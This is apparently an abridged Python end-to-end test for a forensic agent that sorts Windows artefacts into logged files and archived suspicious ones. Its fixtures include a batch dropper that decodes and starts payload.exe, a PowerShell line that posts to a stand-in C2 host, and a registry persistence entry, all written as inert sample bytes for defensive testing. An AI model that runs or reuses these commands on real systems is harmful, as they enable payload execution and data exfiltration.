"""
Windows End-to-End Test for the Forensic Agent
================================================
Mirrors test_e2e.py exactly in structure; differs only in the artefact data.

Known types    (.txt, .pdf, .png, .jpg, .zip) → logged to CSV / DB
Suspicious     (.exe, .dll, .reg, .bat, .ps1, .evtx, .lnk) → archived

Run locally (requires a Windows Docker host):
    docker build -f Dockerfile.test.windows -t forensic-agent-test-windows .
    docker run forensic-agent-test-windows
...
# ---------------------------------------------------------------------------
# Minimal PE / MZ stub shared by .exe and .dll artefacts
# ---------------------------------------------------------------------------
_MZ_STUB = (
...
TEST_FILES = [
    {
        "name": "windows_notes.txt",
        "content": b"Windows forensic evidence notes - plain text content for analysis.",
    },
    {
...
# ---------------------------------------------------------------------------
# Suspicious / invalid file types — Windows-specific, NOT in the allow-list
# → is_valid == False → Archiver compresses them to archives/
# ---------------------------------------------------------------------------
SUSPICIOUS_FILES = [
    {
        "name": "suspicious_binary.exe",
        "content": _MZ_STUB + b"\x00" * 16 + b"PE\x00\x00",
        "description": "PE32 executable — MZ + PE header stub",
    },
    {
        "name": "injected_library.dll",
        "content": _MZ_STUB + b"\x00" * 16 + b"PE\x00\x00" + b"DLL payload",
        "description": "Windows DLL — MZ + PE header stub",
    },
    {
        "name": "registry_export.reg",
        "content": (
            b"Windows Registry Editor Version 5.00\r\n\r\n"
            b"[HKEY_LOCAL_MACHINE\\SOFTWARE\\ForensicTest]\r\n"
            b'"Persistence"="C:\\\\malware\\\\payload.exe"\r\n'
            b'"RunOnce"=dword:00000001\r\n'
        ),
        "description": "Windows Registry export (.reg)",
    },
    {
        "name": "dropper.bat",
        "content": (
            b"@echo off\r\n"
            b"certutil -decode encoded.b64 payload.exe\r\n"
            b"start payload.exe\r\n"
        ),
        "description": "Windows batch dropper script (.bat)",
    },
    {
        "name": "recon.ps1",
        "content": (
            b"# Forensic test PowerShell recon script\r\n"
            b"Get-Process | Export-Csv -Path C:\\Temp\\procs.csv -NoTypeInformation\r\n"
            b"Invoke-WebRequest -Uri http://c2.example.com/exfil -Method POST\r\n"
        ),
        "description": "PowerShell recon/exfil script (.ps1)",
    },
    {
        "name": "security.evtx",
        "content": (
            ...
            + b"\x00" * 8
            + b"\x30\x00\x00\x00"
            + b"Forensic Windows Event Log test data\x00"
        ),
        "description": "Windows Event Log file (.evtx)",
    },
    {
        "name": "malware_shortcut.lnk",
        "content": (
            b"\x4c\x00\x00\x00"
            b"\x01\x14\x02\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46"
            b"Forensic LNK shortcut artefact payload"
        ),
...
async def test_end_to_end_windows() -> None:
    """
    End-to-end test for the ForensicAgent in a Windows environment.
    ...
    """
    logger.info("=" * 60)
    logger.info("  ForensicAgent — Windows Multi-type E2E Test")
    logger.info("=" * 60)
    ...
    try:
        ...
        logger.info("=" * 60)
        logger.info("  ✓  Windows E2E test completed successfully!")
...
if __name__ == "__main__":
    asyncio.run(test_end_to_end_windows())
